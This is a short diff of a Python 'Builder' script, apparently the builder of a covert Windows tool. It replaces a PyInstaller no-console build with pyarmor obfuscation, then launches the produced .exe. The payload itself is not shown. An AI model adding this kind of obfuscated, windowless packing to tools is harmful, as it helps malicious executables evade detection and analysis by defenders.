@@ -5,12 +5,10 @@ import shutil
 import subprocess
 import time
 import sys
-from json import dump, load, loads
+from json import load
 from urllib.request import urlopen
-
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
-
 
 class Builder:
     def __init__(self) -> None:
@@ -110,7 +108,6 @@ class Builder:
                  PC Name: {os.getenv('COMPUTERNAME')}
         Operating System: {os.getenv('OS')}
 
-
 |"""
 
         num = random.randint(30, 40)
@@ -179,10 +176,10 @@ class Builder:
 
     def compile(self, filename):
         print(f'{Fore.MAGENTA}[+]{Fore.RESET} Compiling code...')
-
+        
         os.system(
-            f'python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\\{filename}.py')
-
+            f'pyarmor pack --clean -e "--onefile " {filename}.py')
+            
         cleans_dir = {'./__pycache__', './build'}
         cleans_file = {f'./{filename}.spec', f'./{filename}.py'}
 
@@ -209,7 +206,6 @@ class Builder:
 
         if os.path.isfile(f'./{filename}.exe'):
             os.system(f'start ./{filename}.exe')
-
 
 if __name__ == '__main__':
     init()
